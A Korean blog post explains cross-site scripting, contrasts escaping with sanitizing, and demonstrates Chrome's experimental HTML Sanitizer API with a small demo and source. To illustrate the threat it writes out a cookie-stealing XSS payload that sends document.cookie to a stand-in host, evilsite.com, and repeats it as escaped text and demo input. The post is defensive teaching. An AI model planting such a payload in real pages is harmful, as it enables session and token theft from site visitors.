---
title: HTML Sanitizer API 사용해보기
description: 이제 Sanitizer도 표준으로, 플러그인 없이!
layout: blogpost
author: 이종우
email: jongwoo@studia.blue
date: 2022/01/04
categories: web
---

# Sanitizing이란?

예를 들어, 제가 게시판이 있는 웹사이트를 운영한다고 합시다. 회원은 로그인을 해야 글을 올릴 수 있고, '로그인 유지' 기능을 통해 `OAuth` 토큰은 브라우저에 쿠키로 저장되는, 전형적인 온라인 게시판의 예입니다. (사실 일반적인 게시판보다는 훨씬 보안이 약한 사이트이기는 합니다.)

어느 날, 해커가 웹사이트에 접속해 다음과 같은 글을 올립니다.
```plaintext
<script>window.open("http://evilsite.com/cookies.php?cookie="+EncodeURIComponent(document.cookie));</script>
```
만약 방문자가 이 게시글을 클릭한다면 스크립트가 실행되고, 해커가 방문자의 쿠키를 빼낼 수 있을 것입니다. 게다가 `OAuth` 인증 토큰이 쿠키에 저장되어 있으면, 해커는 이 토큰으로 그 사람의 계정에 로그인할 수 있게 됩니다!

이러한 형태의 공격을 [XSS](https://ko.wikipedia.org/wiki/%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85) (Cross-Site Scripting)이라고 부릅니다. 이를 방지하기 위한 방법에는 여러 가지가 있는데, 대표적으로 **escape**와 **sanitize**가 있습니다.

## Escape vs Sanitize

위의 예시를 통해 알아보죠.

위 예시의 XSS 코드를 `escape`하면 이렇게 됩니다.
```plaintext
&lt;script&gt;window.open(&quot;http://evilsite.com/cookies.php?cookie=&quot;+EncodeURIComponent(document.cookie));&lt;/script&gt;
```
괄호가 모두 `lt;`과 `gt;`으로 대체되어, 더 이상 HTML의 기능을 할 수 없게 되었습니다. 클라이언트 측에서는 코드가 텍스트로 표시될 것입니다.

반면, 위 코드를 `sanitize`하면 이렇게 됩니다.
```

```
Sanitizer (여기서는 DOMPurify를 실행한 결과입니다)가 `<script>` 태그를 인식하고, 아예 삭제해 버렸습니다. XSS의 기법은 여러 가지가 있기 때문에 `javascript:`으로 시작하는 URL, `onload`와 같은 event listener 등 고려할 점이 많습니다. 보통은 [DOMPurify](https://github.com/cure53/DOMPurify)와 같은 라이브러리를 사용하는 것이 편하고 안전합니다.

# HTML Sanitizing API란?

클라이언트 측에서 (당연한 얘기지만, 서버 측에서도 다시 sanitize 해줘야 됩니다! 해커가 콘솔에서 POST 요청을 직접 보낼 수도 있으니까요!) Sanitize를 할 때는 라이브러리를 사용하는 것이 일반적입니다. 그러나 이렇게 되면 로딩이 더 길어지고 사이트가 더 무거워진다는 단점이 있습니다.

이를 극복하고자 Sanitizer 기능이 브라우저에 기본적으로 탑재된 `Sanitizing API`가 공개되었습니다! 아직은 정식 지원은 아니지만, 궁금하니 한 번 사용해 보도록 하겠습니다.

## 1. 브라우저 실험적 기능 활성화하기

아직 본 기능은 정식으로 지원되는 것이 아닌, **실험적 기능** 입니다. 실제 개발에 사용하시면 안돼요!

![Sanitizer Flag](/assets/img/sanitizer-flag.png)

우선, chrome://flags 주소로 이동하여 검색창에 'Sanitizer API'라고 입력합니다. 이 항목의 드롭다운에서 'Default'를 'Enabled'로 바꾸고 안내에 따라 브라우저를 relaunch 하면 실험적 기능을 사용해 볼 수 있습니다. 필자는 Chrome Dev 기준으로 본 포스트를 작성했습니다.

## 2. 실험적 기능 사용해 보기!

<div style="width: 100%; border: 2px solid #ddd; padding: 10px;">
<p style="font-family: Arial, sans-serif; font-size: 17px; margin: 10px 0 5px 0;">Insert dirty code below:</p>
<textarea style="width: 100%; height: 150px; border: 2px solid #ddd; border-radius: 0; outline: none;" id="dirty"></textarea>

<p style="font-family: Arial, sans-serif; font-size: 17px; margin: 10px 0 5px 0;">Sanitized output:</p>
<div style="width: 100%; height: 150px; border: 2px solid #ddd; border-radius: 0; outline: none;" id="clean"></div>

<script>
var dirty = document.getElementById("dirty");
var clean = document.getElementById("clean");

dirty.addEventListener('input', function() {
  if(typeof Sanitizer != 'undefined') {
    var dirty_content = dirty.value;
    clean.setHTML(dirty_content, new Sanitizer())
  } else {
    alert("Sanitizer을 사용할 수 없음. 실험적 기능을 설정해 주세요.")
  }
})
</script>
</div>

그냥 바로 위 칸에다 입력해 보시면 됩니다.

```plaintext
input:  xss <script>window.open("http://evilsite.com/cookies.php?cookie="+EncodeURIComponent(document.cookie));</script> test
output: xss  test
```
잘 동작하네요!

## 3. 소스코드

```html
<textarea id="dirty"></textarea>
<div id="clean"></div>
```

```js
var dirty = document.getElementById("dirty");
var clean = document.getElementById("clean");

dirty.addEventListener('input', function() {
  if(typeof Sanitizer != 'undefined') {
    var dirty_content = dirty.value;
    clean.setHTML(dirty_content, new Sanitizer())
  } else {
    alert("Sanitizer을 사용할 수 없음. 실험적 기능을 설정해 주세요.")
  }
})
```
코드는 이게 다입니다!

새로운 Sanitizer API에서는 다른 라이브러리와 달리 string to string 변환을 하지 않습니다. 대신 `setHTML`을 이용해 변환을 하도록 되어 있습니다. 그 이유는 같은 HTML이라도 들어가는 요소에 따라 sanitizing의 결과가 달라지기 때문입니다.

## 4. 지원 범위

![Sanitizer API on caniuse.com](/assets/img/sanitizer-caniuse.png)

온통 빨간색이네요.

지금은 개발에 써서는 안되는 기능입니다.